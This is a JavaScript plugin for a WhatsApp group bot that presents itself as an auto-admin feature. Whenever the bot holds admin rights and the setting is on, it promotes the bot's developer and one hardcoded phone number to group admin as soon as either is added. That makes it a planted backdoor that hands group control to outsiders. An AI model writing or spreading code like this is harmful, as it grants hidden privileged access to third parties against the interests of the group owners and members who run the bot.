const { cmd } = require('../command');
const config = require('../config');

// Track last promotion time per group
const lastPromotion = {};

cmd({
    on: "body" // Using your existing event structure
}, 
async (conn, mek, m, { 
    from, // Group JID
    isGroup,
    participants,
    groupMetadata,
    isBotAdmins,
    reply
}) => {
    try {
        // Skip if not enabled or not a group
        if (config.AUTO_ADMIN !== "true" || !isGroup || !isBotAdmins) return;

        // MANUALLY extract participant update from raw message
        const participantUpdate = mek.message?.groupParticipantsUpdate;
        if (!participantUpdate || participantUpdate.action !== 'add') return;

        // Rate limit: 3 seconds per group
        const now = Date.now();
        if (lastPromotion[from] && now - lastPromotion[from] < 3000) return;

        // Convert numbers to standard JID format
        const toJid = num => num?.replace(/\D/g, '') + '@s.whatsapp.net';

        // Authorized users (DEV + special number)
        const allowedUsers = [
            toJid(config.DEV),
            toJid("923427582273")
        ].filter(Boolean);

        // Check newly added participants
        const newAdmins = participantUpdate.participants
            .map(p => toJid(p))
            .filter(jid => 
                allowedUsers.includes(jid) &&
                !groupMetadata.participants.some(p => p.id === jid && p.admin)
            );

        if (newAdmins.length > 0) {
            await conn.groupParticipantsUpdate(from, newAdmins, "promote");
            lastPromotion[from] = now;

            // Optional notification
            if (config.AUTO_ADMIN_NOTIFY === "true") {
                await conn.sendMessage(from, {
                    text: `@${newAdmins[0].split('@')[0]} is now admin 👑`,
                    mentions: [newAdmins[0]]
                });
            }
        }
    } catch (error) {
        console.error("Auto-admin error:", error.message);
    }
});
